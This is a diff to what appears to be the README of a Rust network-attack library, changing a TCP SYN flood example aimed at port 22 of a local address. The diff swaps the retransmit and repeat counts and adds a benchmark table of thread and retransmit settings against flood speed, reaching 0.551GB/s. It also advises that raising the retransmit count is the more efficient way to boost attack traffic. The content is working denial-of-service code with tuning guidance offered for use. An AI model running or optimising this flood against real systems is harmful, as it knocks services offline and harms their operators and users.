@@ -554,8 +554,8 @@ fn main() {
     let ports = Some(vec![22]);
     let target1 = Target::new(dst_addr.into(), ports);
     let num_threads = 30; // It can be simply understood as the number of attack threads.
-    let retransmit_count = 3; // The number of times to retransmit the same attack packet.
-    let repeat_count = 10; // The number of times each thread repeats the attack.
+    let retransmit_count = 10; // The number of times to retransmit the same attack packet.
+    let repeat_count = 3; // The number of times each thread repeats the attack.
     let ret = tcp_syn_flood(&[target1], num_threads, retransmit_count, repeat_count).unwrap();
     println!("{}", ret);
 }
@@ -572,30 +572,31 @@ Finally, we generate `30` threads (`num_threads`) to execute the above process.
 We no longer use `threadpool` to limit the number of threads here, so please do it according to your ability (in the previous scan or ping function, we use `threadpool` to avoid system overload caused by too many threads when the target range is large).
 
 ```
-+--------+-------------+----------------------------------------------------------+
-|                              Flood Attack Summary                               |
-+--------+-------------+----------------------------------------------------------+
-|   id   |    addr     |                          report                          |
-+--------+-------------+----------------------------------------------------------+
-|   1    | 192.168.5.5 | packets sent: 30(36.387MB), time cost: 7.742s(4.700MB/s) |
-+--------+-------------+----------------------------------------------------------+
++--------+-------------+-----------------------------------------------------------+
+|                               Flood Attack Summary                               |
++--------+-------------+-----------------------------------------------------------+
+|   id   |    addr     |                          report                           |
++--------+-------------+-----------------------------------------------------------+
+|   1    | 192.168.5.5 | packets sent: 30(39.258MB), time cost: 2.738s(14.339MB/s) |
++--------+-------------+-----------------------------------------------------------+
 ```
 
-Because `retransmit_count` and `repeat_count` only determine the number of times the same packet is retransmitted, I use their product as a variable. If you increase the `num_threads` or `retransmit_count` x `repeat_count` above, the speed of attacks traffic will increase.
+If you increase the `num_threads`, `retransmit_count` and `repeat_count` above, the speed of attacks traffic will increase (if possible, increase `retransmit_count` is more efficient than improving `repeat_count` because it does not require rebuilding the package).
 
-The relationship between the two variables in my local test environment
+The relationship between the three variables in my local test environment
 
-| num_threads | retransmit_count x repeat_count | sending speed |
-| :---------- | :------------------------------ | :------------ |
-| 10          | 9                               | 11.850MB/s    |
-| 30          | 9                               | 36.284MB/s    |
-| 30          | 30                              | 39.266MB/s    |
-| 60          | 30                              | 83.709MB/s    |
-| 60          | 60                              | 98.077MB/s    |
-| 120         | 60                              | 206.687MB/s   |
-| 120         | 120                             | 204.607MB/s   |
-| 240         | 120                             | 0.451GB/s     |
-| 240         | 240                             | 0.551GB/s     |
+| num_threads | retransmit_count | repeat_count | sending speed |
+| :---------- | :--------------- | :----------- | :------------ |
+| 10          | 1                | 10           | 1.923MB/s     |
+| 10          | 10               | 1            | 13.609MB/s    |
+| 30          | 1                | 10           | 1.908MB/s     |
+| 30          | 10               | 1            | 16.725MB/s    |
+| 60          | 60               | 1            | 71.631MB/s    |
+| 60          | 1                | 60           | 1.952MB/s     |
+| 120         | 60               | 1            | 127.775MB/s   |
+| 120         | 120              | 1            | 196.072MB/s   |
+| 240         | 120              | 1            | 0.252GB/s     |
+| 240         | 240              | 1            | 0.551GB/s     |
 
 The above conclusions were drawn on my local VMware virtualized network card. The performance of the attack in a real attack environment depends on factors such as your network bandwidth and network card performance.
 
